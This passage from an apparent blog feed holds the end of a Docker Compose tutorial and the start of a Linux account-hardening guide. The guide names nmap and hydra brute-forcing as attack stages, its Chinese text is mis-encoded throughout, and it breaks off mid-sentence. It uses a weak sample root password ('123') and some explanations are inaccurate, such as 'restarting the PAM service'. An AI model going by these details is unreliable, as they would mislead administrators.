id="8-4-æµ‹è¯•è®¿é—®"><a href="#8-4-æµ‹è¯•è®¿é—®" class="headerlink" title="8.4 æµ‹è¯•è®¿é—®"></a>8.4 æµ‹è¯•è®¿é—®</h2><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-18%2011.06.33.png" style="zoom:50%;"><p>å¤§åŠŸå‘ŠæˆğŸ‰ã€‚</p><h1 id="ä¹ã€DockerCompose"><a href="#ä¹ã€DockerCompose" class="headerlink" title="ä¹ã€DockerCompose"></a>ä¹ã€DockerCompose</h1><p>Docker Composeé€šè¿‡ä¸€ä¸ªå•ç‹¬çš„<strong>docker-compose.yml</strong> æ¨¡æ¿æ–‡ä»¶ï¼ˆYAML æ ¼å¼ï¼‰æ¥å®šä¹‰ä¸€ç»„ç›¸å…³è”çš„åº”ç”¨å®¹å™¨ï¼Œå¸®åŠ©æˆ‘ä»¬å®ç°å¤šä¸ªç›¸äº’å…³è”çš„Dockerå®¹å™¨çš„å¿«é€Ÿéƒ¨ç½²ã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-19%2017.57.59.png" style="zoom:50%;"><p>docker runå’ŒDockerComposeå…·æœ‰ä¸€å®šçš„å¯¹åº”å…³ç³»ã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-19%2017.59.45.png" style="zoom:50%;"><p><strong>docker compose</strong>çš„å‘½ä»¤æ ¼å¼å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> compose <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> <span class="token punctuation">[</span>COMMAND<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th><strong>ç±»å‹</strong></th><th><strong>å‚æ•°æˆ–æŒ‡ä»¤</strong></th><th><strong>è¯´æ˜</strong></th></tr></thead><tbody><tr><td>Options</td><td>-f</td><td>æŒ‡å®šcomposeæ–‡ä»¶çš„è·¯å¾„å’Œåç§°</td></tr><tr><td>Options</td><td>-p</td><td>æŒ‡å®šprojectåç§°</td></tr><tr><td>Commands</td><td>up</td><td>åˆ›å»ºå¹¶å¯åŠ¨æ‰€æœ‰serviceå®¹å™¨</td></tr><tr><td>Commands</td><td>down</td><td>åœæ­¢å¹¶ç§»é™¤æ‰€æœ‰å®¹å™¨ã€ç½‘ç»œ</td></tr><tr><td>Commands</td><td>ps</td><td>åˆ—å‡ºæ‰€æœ‰å¯åŠ¨çš„å®¹å™¨</td></tr><tr><td>Commands</td><td>logs</td><td>æŸ¥çœ‹æŒ‡å®šå®¹å™¨çš„æ—¥å¿—</td></tr><tr><td>Commands</td><td>stop</td><td>åœæ­¢å®¹å™¨</td></tr><tr><td>Commands</td><td>start</td><td>å¯åŠ¨å®¹å™¨</td></tr><tr><td>Commands</td><td>restart</td><td>é‡å¯å®¹å™¨</td></tr><tr><td>Commands</td><td>top</td><td>æŸ¥çœ‹è¿è¡Œçš„è¿›ç¨‹</td></tr><tr><td>Commands</td><td>exec</td><td>åœ¨æŒ‡å®šçš„è¿è¡Œä¸­å®¹å™¨ä¸­æ‰§è¡Œå‘½ä»¤</td></tr></tbody></table><p>é€šè¿‡dockerComposeéƒ¨ç½²åº”ç”¨çš„ymlæ–‡ä»¶ï¼šdocker-compose.yml</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">"3.8"</span><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">mysql</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> mysql    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> mysql    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"3306:3306"</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token key atrule">TZ</span><span class="token punctuation">:</span> Asia/Shanghai      <span class="token key atrule">MYSQL_ROOT_PASSWORD</span><span class="token punctuation">:</span> <span class="token number">123</span>    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"./mysql/conf:/etc/mysql/conf.d"</span>      <span class="token punctuation">-</span> <span class="token string">"./mysql/data:/var/lib/mysql"</span>      <span class="token punctuation">-</span> <span class="token string">"./mysql/init:/docker-entrypoint-initdb.d"</span>    <span class="token key atrule">networks</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> hm<span class="token punctuation">-</span>net  <span class="token key atrule">hmall</span><span class="token punctuation">:</span>    <span class="token key atrule">build</span><span class="token punctuation">:</span>       <span class="token key atrule">context</span><span class="token punctuation">:</span> .      <span class="token key atrule">dockerfile</span><span class="token punctuation">:</span> Dockerfile    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> hmall    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"8080:8080"</span>    <span class="token key atrule">networks</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> hm<span class="token punctuation">-</span>net    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> mysql  <span class="token key atrule">nginx</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> nginx    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> nginx    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"18080:18080"</span>      <span class="token punctuation">-</span> <span class="token string">"18081:18081"</span>    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"./nginx/nginx.conf:/etc/nginx/nginx.conf"</span>      <span class="token punctuation">-</span> <span class="token string">"./nginx/html:/usr/share/nginx/html"</span>    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> hmall    <span class="token key atrule">networks</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> hm<span class="token punctuation">-</span>net<span class="token key atrule">networks</span><span class="token punctuation">:</span>  <span class="token key atrule">hm-net</span><span class="token punctuation">:</span>    <span class="token key atrule">name</span><span class="token punctuation">:</span> hmall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‡ç‚¹å…³æ³¨å„ç±»è·¯å¾„é—®é¢˜ã€‚</p><blockquote><p>Docker Compose æ–‡ä»¶ä¸­çš„ <code>version</code> å­—æ®µç”¨äºæŒ‡å®šä½¿ç”¨çš„ Compose æ–‡ä»¶æ ¼å¼ç‰ˆæœ¬ã€‚è¿™ä¸ªå­—æ®µå¯¹äºç¡®ä¿ä½ çš„ Compose æ–‡ä»¶èƒ½å¤Ÿè¢« Docker Compose æ­£ç¡®è§£æéå¸¸é‡è¦ï¼Œå› ä¸ºä¸åŒç‰ˆæœ¬çš„ Compose æ”¯æŒä¸åŒçš„è¯­æ³•å’Œç‰¹æ€§ã€‚</p></blockquote><p>å°†ä¹‹å‰çš„å®¹å™¨/é•œåƒå…¨éƒ½åˆ é™¤ä¹‹åï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„ç›®å½•ï¼Œç›®å½•å†…å®¹ï¼š</p><p>è¿˜éœ€è¦æ³¨æ„ä¸€ä¸‹Dockerfileä¸­æ„å»ºçš„é•œåƒæ˜¯ä¹‹å‰ideaæ‰“å¥½çš„jaråŒ…â€”â€”hm-service.jarã€‚</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-19%2018.12.54.png" alt="æˆªå±2024-12-19 18.12.54"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> compose <span class="token parameter variable">-p</span> heimamall  up  <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-19%2018.17.37.png" style="zoom:50%;"><p>dpsæŸ¥çœ‹å®¹å™¨ï¼š</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-19%2018.17.49.png" alt="æˆªå±2024-12-19 18.17.49" style="zoom:50%;"><p>è®¿é—®æµ‹è¯•ï¼š</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-19%2018.18.48.png" style="zoom:50%;"><p>docker composeä¸€é”®éƒ¨ç½²æˆåŠŸã€‚</p><p>åˆ é™¤é¡¹ç›®ï¼š</p><pre class="line-numbers language-none"><code class="language-none">docker compose -p heimamall  down<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-19%2018.27.57.png" alt="æˆªå±2024-12-19 18.27.57"></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://b11et3un53m.feishu.cn/wiki/Rfocw7ctXij2RBkShcucLZbrn2d">https://b11et3un53m.feishu.cn/wiki/Rfocw7ctXij2RBkShcucLZbrn2d</a> </p><p><a href="https://www.cnblogs.com/dakewei/p/10831125.html">https://www.cnblogs.com/dakewei/p/10831125.html</a></p>]]></content>
      
      
      <categories>
          
          <category> è™šæ‹ŸåŒ–æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è™šæ‹ŸåŒ–æŠ€æœ¯ </tag>
            
            <tag> å®¹å™¨åŒ–æŠ€æœ¯ </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxå®‰å…¨åŠ å›ºä¹‹è´¦æˆ·å®‰å…¨åŠ å›º</title>
      <link href="/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/"/>
      <url>/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€è´¦å·å®‰å…¨çš„é‡è¦æ€§"><a href="#ä¸€ã€è´¦å·å®‰å…¨çš„é‡è¦æ€§" class="headerlink" title="ä¸€ã€è´¦å·å®‰å…¨çš„é‡è¦æ€§"></a>ä¸€ã€è´¦å·å®‰å…¨çš„é‡è¦æ€§</h1><p>åœ¨å½“ä»Šå¾ˆå¤šç½‘ç»œç³»ç»Ÿéƒ½ä»¥ç”¨æˆ·å(å¸å·)å’Œå£ä»¤ä½œä¸ºé‰´æƒæ–¹å¼ï¼Œå£ä»¤çš„é‡è¦æ€§å°±å¯æƒ³è€ŒçŸ¥äº†ã€‚å£ä»¤å°±ç›¸å½“æ‰‹è¿›å…¥å®¶é—¨çš„é’¥åŒ™ï¼Œå½“ä»–äººæœ‰ä¸€æŠŠå¯ä»¥è¿›å…¥ä½ å®¶çš„é’¥åŒ™ï¼Œæƒ³æƒ³ä½ çš„å®‰å…¨ã€ä½ çš„è´¢ç‰©ã€ä½ çš„éšç§ã€‚ã€‚ã€‚å®³æ€•äº†å§ã€‚å› ä¸ºå¼±å£ä»¤å¾ˆå®¹æ˜“è¢«ä»–äººçŒœåˆ°æˆ–ç ´è§£ï¼Œæ‰€ä»¥å¦‚æœä½ ä½¿ç”¨å¼±å£ä»¤ï¼Œå°±åƒæŠŠå®¶é—¨é’¥åŒ™æ”¾åœ¨å®¶é—¨å£çš„å«å­ä¸‹é¢ï¼Œæ˜¯éå¸¸å±é™©çš„ã€‚</p><p>ä¸€èˆ¬æ”»å‡»è€…çš„æ¸—é€è¿‡ç¨‹éƒ½ä¼šç»è¿‡å¦‚ä¸‹å‡ ä¸ªé˜¶æ®µï¼š</p><ul><li>æ‰«ææ¢æµ‹=&gt;æ¸—é€æ”»å‡»=&gt;æ”»é™·å…¥ä¾µ=&gt;æ¶æ„è¡Œä¸ºã€‚</li></ul><h2 id="1-1-æ‰«ææ¢æµ‹"><a href="#1-1-æ‰«ææ¢æµ‹" class="headerlink" title="1.1 æ‰«ææ¢æµ‹"></a>1.1 æ‰«ææ¢æµ‹</h2><p>æ‰«ææ¢æµ‹ï¼šæ”»å‡»è€…åœ¨æ”»å‡»å‰çš„å¯¹ç›®æ ‡çš„æ‰«æï¼ŒåŒ…æ‹¬ç½‘ç»œæ‰«æã€ç³»ç»Ÿæ‰«æã€ç«¯å£ã€æ¼æ´æ‰«æç­‰ï¼Œæ‰«æè¡Œä¸ºæ˜¯æ”»å‡»å…¥ä¾µçš„å‰æœŸå‡†å¤‡é˜¶æ®µï¼Œé€šè¿‡ä¿¡æ¯æ”¶é›†ï¼ŒæŒæ¡ç›®æ ‡æœºå™¨çš„ç³»ç»Ÿï¼Œæ¼æ´ä¿¡æ¯ï¼Œå¯¹è¿›ä¸€æ­¥è¿›è¡Œå…¥ä¾µæ”»å‡»æœ‰äº‹åŠåŠŸå€çš„æ•ˆæœã€‚</p><ul><li>å¦‚ä½¿ç”¨netdiscover/nmapç­‰å·¥å…·</li></ul><img src="/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/%E6%88%AA%E5%B1%8F2024-12-11%2013.31.32.png" style="zoom:50%;"><h2 id="1-2-æ¸—é€æ”»å‡»"><a href="#1-2-æ¸—é€æ”»å‡»" class="headerlink" title="1.2 æ¸—é€æ”»å‡»"></a>1.2 æ¸—é€æ”»å‡»</h2><p>è¯¥é˜¶æ®µæ˜¯å·²ç»å¯¹ç›®æ ‡æœºå™¨åšäº†æ‰«æï¼Œæˆ–æ˜¯ç›´æ¥å¯¹ç›®æ ‡æœºå™¨è¿›è¡Œæ”»å‡»ï¼ŒåŒ…æ‹¬åˆ©ç”¨ç³»ç»Ÿæ ˆå †æ–¹é¢çš„æ¼æ´ï¼Œåˆ©ç”¨Webç³»ç»Ÿå¹³å°æ–¹é¢çš„æ¼æ´ï¼Œé€»è¾‘é…ç½®é”™è¯¯æ–¹é¢çš„æ¼æ´ï¼Œå†…å­˜ç ´åæ–¹é¢çš„æ¼æ´ç­‰ï¼Œå¯¹ç›®æ ‡ä¸»æœºå‘èµ·æ”»å‡»ã€‚</p><ul><li>å¦‚ä½¿ç”¨hydraè¿›è¡Œå£ä»¤çˆ†ç ´</li></ul><img src="/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/%E6%88%AA%E5%B1%8F2024-12-11%2013.35.27.png" style="zoom:40%;"><h2 id="1-3-æ”»é™·å…¥ä¾µ"><a href="#1-3-æ”»é™·å…¥ä¾µ" class="headerlink" title="1.3 æ”»é™·å…¥ä¾µ"></a>1.3 æ”»é™·å…¥ä¾µ</h2><p>è¯¥é˜¶æ®µè¡¨ç¤ºäº†ç›®æ ‡ä¸»æœºå·²ç»è¢«é»‘å®¢æˆåŠŸæ”»é™·ï¼Œæ¥ä¸‹æ¥æ”»å‡»è€…å¯ä»¥åšä»–æƒ³åšçš„äº‹æƒ…ï¼Œæ”»é™·é˜¶æ®µçš„è¡¨ç°å½¢å¼æ¯”å¦‚ï¼ŒSSHç™»å½•æˆåŠŸï¼ŒFTPç™»å½•æˆåŠŸã€‚</p><ul><li>å¦‚ä¸‹ï¼Œé€šè¿‡hydraæˆåŠŸçˆ†ç ´å‡ºsshçš„è´¦å·å¯†ç ï¼Œç„¶åè¿›è¡Œç™»å½•ã€‚</li></ul><img src="/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/%E6%88%AA%E5%B1%8F2024-12-11%2013.37.02.png" style="zoom:50%;"><h2 id="1-4-æ¶æ„è¡Œä¸º"><a href="#1-4-æ¶æ„è¡Œä¸º" class="headerlink" title="1.4 æ¶æ„è¡Œä¸º"></a>1.4 æ¶æ„è¡Œä¸º</h2><p>æ”»å‡»è€…åœ¨ç›®æ ‡ä¸»æœºå¯èƒ½è¿›è¡Œåˆ åº“ï¼Œä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œä¸‹è½½æ•°æ®åº“æ–‡ä»¶æˆ–è€…å®‰è£…å®Œæ¶æ„è½¯ä»¶åè¿›è¡Œå¯¹ä¸»æœºè¿›è¡Œæ¶æ„æ“ä½œç­‰ã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>é€šè¿‡ä¸Šè¿°ç¤ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥äº†è§£åˆ°å¦‚æœè´¦æˆ·å’Œå£ä»¤å®‰å…¨æ€§è¾ƒä½ä¼šå¤§å¤§å¢åŠ è¢«æ”»é™·å…¥ä¾µçš„å¯èƒ½æ€§ï¼Œå› æ­¤è´¦å·å£ä»¤å®‰å…¨åŠ å›ºçš„é‡è¦æ€§ä¸è¨€è€Œå–»ã€‚</p><p>ä¸€èˆ¬è€Œè¨€ï¼Œä¸€ç§å¸¸è§çš„åŠ å›ºæ€è·¯æ¯”å¦‚ï¼šä¿®æ”¹ç”¨æˆ·å£ä»¤æœ‰æ•ˆæœºåˆ¶ï¼Œç”¨æˆ·ç¦»å¼€å·¥ä½œå²—ä½ä¸€æ®µæ—¶é—´åï¼Œå…¶è´¦æˆ·è‡ªåŠ¨å¤±æ•ˆï¼Œå°±ç®—ç®¡ç†å‘˜å¿˜è®°åˆ é™¤è¯¥è´¦æˆ·ï¼Œè¯¥è´¦æˆ·ä¹Ÿä¸ä¼šç»™ç³»ç»Ÿå¸¦æ¥å±å®³ã€‚</p><h1 id="äºŒã€è´¦æˆ·æœŸé™åŠ å›º"><a href="#äºŒã€è´¦æˆ·æœŸé™åŠ å›º" class="headerlink" title="äºŒã€è´¦æˆ·æœŸé™åŠ å›º"></a>äºŒã€è´¦æˆ·æœŸé™åŠ å›º</h1><h2 id="2-1-etc-login-defsæ–‡ä»¶"><a href="#2-1-etc-login-defsæ–‡ä»¶" class="headerlink" title="2.1 /etc/login.defsæ–‡ä»¶"></a>2.1 /etc/login.defsæ–‡ä»¶</h2><p><code>/etc/login.defs</code> æ˜¯ä¸€ä¸ªç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼Œå®ƒåŒ…å«äº†è®¸å¤šä¸ç”¨æˆ·è´¦æˆ·å’Œå¯†ç ç›¸å…³çš„é…ç½®é€‰é¡¹ã€‚åœ¨ç±» Unix ç³»ç»Ÿä¸­ï¼Œè¿™ä¸ªæ–‡ä»¶å®šä¹‰äº†ç³»ç»Ÿçº§çš„ç”¨æˆ·è´¦æˆ·å’Œå¯†ç ç®¡ç†çš„é»˜è®¤å€¼å’Œé™åˆ¶ã€‚ä¸åŒçš„ç³»ç»Ÿå’Œå‘è¡Œç‰ˆå¯èƒ½ä¼šæœ‰ä¸åŒçš„é…ç½®é€‰é¡¹ï¼Œä½†ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„é…ç½®é¡¹ï¼š</p><ol><li><strong>PASS_MAX_DAYS</strong>ï¼šå¯†ç çš„æœ€å¤§æœ‰æ•ˆå¤©æ•°ã€‚</li><li><strong>PASS_MIN_DAYS</strong>ï¼šå¯†ç çš„æœ€å°æœ‰æ•ˆå¤©æ•°ã€‚</li><li><strong>PASS_WARN_AGE</strong>ï¼šåœ¨å¯†ç è¿‡æœŸå‰å¤šå°‘å¤©å¼€å§‹è­¦å‘Šç”¨æˆ·ã€‚</li><li><strong>ENCRYPT_METHOD</strong>ï¼šå¯†ç åŠ å¯†çš„æ–¹æ³•ã€‚</li><li><strong>UID_MIN</strong> å’Œ <strong>UID_MAX</strong>ï¼šç³»ç»Ÿç”¨æˆ·å’Œç»„çš„æœ€å°å’Œæœ€å¤§ç”¨æˆ·IDã€‚</li><li><strong>GID_MIN</strong> å’Œ <strong>GID_MAX</strong>ï¼šç³»ç»Ÿç»„çš„æœ€å°å’Œæœ€å¤§ç»„IDã€‚</li><li><strong>CREATE_HOME</strong>ï¼šå½“åˆ›å»ºæ–°ç”¨æˆ·æ—¶æ˜¯å¦åˆ›å»ºå®¶ç›®å½•ã€‚</li><li><strong>UMASK</strong>ï¼šæ–°æ–‡ä»¶çš„é»˜è®¤æƒé™æ©ç ã€‚</li><li><strong>USERGROUPS_ENAB</strong>ï¼šæ˜¯å¦å…è®¸ç”¨æˆ·å±äºå¤šä¸ªç»„ã€‚</li><li><strong>MAIL_DIR</strong>ï¼šç”¨æˆ·çš„é‚®ä»¶ç›®å½•ã€‚</li><li><strong>MAIL_FILE</strong>ï¼šç”¨æˆ·çš„é‚®ä»¶æ–‡ä»¶ã€‚</li><li><strong>SU_NAME</strong>ï¼šé»˜è®¤çš„è¶…çº§ç”¨æˆ·åç§°ã€‚</li></ol><p>ä¿®æ”¹ <code>/etc/login.defs</code> æ–‡ä»¶å¯ä»¥æ”¹å˜è¿™äº›é»˜è®¤å€¼ï¼Œä½†é€šå¸¸éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚åœ¨ä¿®æ”¹æ­¤æ–‡ä»¶æ—¶åº”è¯¥éå¸¸å°å¿ƒï¼Œå› ä¸ºé”™è¯¯çš„é…ç½®å¯èƒ½ä¼šå¯¼è‡´å®‰å…¨é—®é¢˜æˆ–ç³»ç»ŸåŠŸèƒ½ä¸æ­£å¸¸ã€‚åœ¨ç¼–è¾‘æ–‡ä»¶åï¼Œé€šå¸¸éœ€è¦é‡æ–°å¯åŠ¨ç›¸å…³çš„æœåŠ¡æˆ–è€…ç³»ç»Ÿï¼Œä»¥ä½¿æ›´æ”¹ç”Ÿæ•ˆã€‚å¯¹äºå¤§å¤šæ•°æ›´æ”¹ï¼Œä½ å¯èƒ½éœ€è¦é‡æ–°å¯åŠ¨ <code>pam</code>ï¼ˆå¯æ’æ‹”è®¤è¯æ¨¡å—ï¼‰æœåŠ¡æˆ–è€…é‡å¯ç³»ç»Ÿã€‚</p><img src="/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/%E6%88%AA%E5%B1%8F2024-12-11%2014.01.46.png" style="zoom:30%;"><p>é€šå¸¸è¦ä¿®æ”¹ä¸‹é¢ä¸¤ä¸ªä¸ªå­—æ®µï¼š</p><ol><li><strong>PASS_MAX_DAYS</strong>ï¼šå¯†ç çš„æœ€å¤§æœ‰æ•ˆå¤©æ•°ã€‚</li><li><strong>PASS_WARN_AGE</strong>ï¼šåœ¨å¯†ç è¿‡æœŸå‰å¤šå°‘å¤©å¼€å§‹è­¦å‘Šç”¨æˆ·ã€‚</li></ol><h2 id="2-2-etc-default-useraddæ–‡ä»¶"><a href="#2-2-etc-default-useraddæ–‡ä»¶" class="headerlink" title="2.2  /etc/default/useraddæ–‡ä»¶"></a>2.2  /etc/default/useraddæ–‡ä»¶</h2><p>åœ¨ <code>/etc/default/useradd</code> æ–‡ä»¶ä¸­ï¼Œ<code>INACTIVE</code> å’Œ <code>EXPIRE</code> æ˜¯ä¸¤ä¸ªä¸ç”¨æˆ·è´¦æˆ·è¿‡æœŸç›¸å…³çš„é…ç½®é¡¹ï¼š</p><ol><li><strong>INACTIVE</strong>ï¼šè¿™ä¸ªé…ç½®é¡¹ç”¨æ¥è®¾ç½®å¯†ç è¿‡æœŸåè´¦æˆ·è¢«ç¦ç”¨ä¹‹å‰çš„å¤©æ•°ã€‚å¦‚æœ <code>INACTIVE</code> è®¾ç½®ä¸º <code>-1</code>ï¼Œåˆ™è¡¨ç¤ºè´¦æˆ·ä¸ä¼šå› å¯†ç è¿‡æœŸè€Œè¢«ç¦ç”¨ï¼Œè¿™æ˜¯é»˜è®¤å€¼ã€‚å¦‚æœè®¾ç½®ä¸ºå…¶ä»–å€¼ï¼Œæ¯”å¦‚ <code>30</code>ï¼Œåˆ™è¡¨ç¤ºå¦‚æœç”¨æˆ·åœ¨å¯†ç è¿‡æœŸå30å¤©å†…æ²¡æœ‰æ›´æ–°å¯†ç ï¼Œè´¦æˆ·å°†è¢«ç¦ç”¨ã€‚</li><li><strong>EXPIRE</strong>ï¼šè¿™ä¸ªé…ç½®é¡¹ç”¨æ¥è®¾ç½®è´¦æˆ·çš„è¿‡æœŸæ—¥æœŸã€‚å¦‚æœè®¾ç½®äº† <code>EXPIRE</code>ï¼Œé‚£ä¹ˆè´¦æˆ·å°†åœ¨æŒ‡å®šçš„æ—¥æœŸåè¿‡æœŸã€‚æ—¥æœŸæ ¼å¼é€šå¸¸æ˜¯ <code>MM/DD/YY</code> æˆ– <code>YYYY-MM-DD</code>ã€‚å¦‚æœæ²¡æœ‰è®¾ç½® <code>EXPIRE</code> æˆ–è€…ç•™ç©ºï¼Œé‚£ä¹ˆè´¦æˆ·å°†ä¸ä¼šè¿‡æœŸã€‚</li></ol><p>ä¾‹å¦‚ï¼Œå¦‚æœä½ æƒ³è¦è®¾ç½®ä¸€ä¸ªæ–°ç”¨æˆ·çš„è´¦æˆ·åœ¨å¯†ç è¿‡æœŸå7å¤©å†…è¢«ç¦ç”¨ï¼Œä»¥åŠè´¦æˆ·åœ¨2024å¹´12æœˆ31æ—¥è¿‡æœŸï¼Œä½ å¯ä»¥åœ¨ <code>/etc/default/useradd</code> æ–‡ä»¶ä¸­è®¾ç½®å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">INACTIVE</span><span class="token operator">=</span><span class="token number">7</span><span class="token assign-left variable">EXPIRE</span><span class="token operator">=</span><span class="token number">2024</span>-12-31<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿™æ ·ï¼Œä»»ä½•æ–°æ·»åŠ çš„ç”¨æˆ·éƒ½å°†éµå¾ªè¿™äº›é»˜è®¤è®¾ç½®ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™äº›è®¾ç½®åªå½±å“æ–°æ·»åŠ çš„ç”¨æˆ·ï¼Œå¯¹äºå·²ç»å­˜åœ¨çš„ç”¨æˆ·ï¼Œéœ€è¦ä½¿ç”¨ <code>usermod</code> å‘½ä»¤å•ç‹¬è®¾ç½®ã€‚</p><img src="/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/%E6%88%AA%E5%B1%8F2024-12-11%2014.06.48.png" style="zoom:30%;"><h1 id="ä¸‰ã€è´¦å·å¯†ç ç­–ç•¥åŠ å›º"><a href="#ä¸‰ã€è´¦å·å¯†ç ç­–ç•¥åŠ å›º" class="headerlink" title="ä¸‰ã€è´¦å·å¯†ç ç­–ç•¥åŠ å›º"></a>ä¸‰ã€è´¦å·å¯†ç ç­–ç•¥åŠ å›º</h1><h2 id="3-1-å¯†ç å¤æ‚åº¦åŠ å›º"><a href="#3-1-å¯†ç å¤æ‚åº¦åŠ å›º" class="headerlink" title="3.1 å¯†ç å¤æ‚åº¦åŠ å›º"></a>3.1 å¯†ç å¤æ‚åº¦åŠ å›º</h2><h3 id="3-1-1-etc-pam-d-system-authç®€ä»‹"><a href="#3-1-1-etc-pam-d-system-authç®€ä»‹" class="headerlink" title="3.1.1 /etc/pam.d/system-authç®€ä»‹"></a>3.1.1 /etc/pam.d/system-authç®€ä»‹</h3><p><code>/etc/pam.d/system-auth</code> æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„é…ç½®æ–‡ä»¶ï¼Œå®ƒä½äº Linux ç³»ç»Ÿä¸­ï¼Œç”¨äºå®šä¹‰ç”¨æˆ·è®¤è¯çš„è¡Œä¸ºã€‚PAMï¼ˆPluggable Authentication Modulesï¼‰æ˜¯ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“å’Œä¸€ç»„åº”ç”¨ç¨‹åºæ¥å£ï¼ˆAPIï¼‰ï¼Œå®ƒä»¬å…è®¸å°†å¤šä¸ªè®¤è¯æœºåˆ¶é›†æˆåˆ°ç³»ç»Ÿä¸­çš„åº”ç”¨ç¨‹åºä¸­ã€‚<code>system-auth</code> æ–‡ä»¶é€šå¸¸ç”¨äºå¤„ç†ç³»ç»Ÿçš„è®¤è¯ä»»åŠ¡ï¼Œå¦‚ç™»å½•ã€å¯†ç æ›´æ”¹ç­‰ã€‚</p><h3 id="3-1-2-é…ç½®æ–‡ä»¶ç»“æ„"><a href="#3-1-2-é…ç½®æ–‡ä»¶ç»“æ„" class="headerlink" title="3.1.2 é…ç½®æ–‡ä»¶ç»“æ„"></a>3.1.2 é…ç½®æ–‡ä»¶ç»“æ„</h3><p><code>/etc/pam.d/system-auth</code> æ–‡ä»¶åŒ…å«ä¸€ç³»åˆ—çš„æ¨¡å—æ¡ç›®ï¼Œæ¯ä¸ªæ¡ç›®éƒ½æŒ‡å®šäº†å¦‚ä½•å¤„ç†ç‰¹å®šçš„è®¤è¯è¯·æ±‚ã€‚è¿™äº›æ¡ç›®é€šå¸¸åŒ…æ‹¬ä»¥ä¸‹å­—æ®µï¼š</p><ol><li><strong>æ§åˆ¶æ 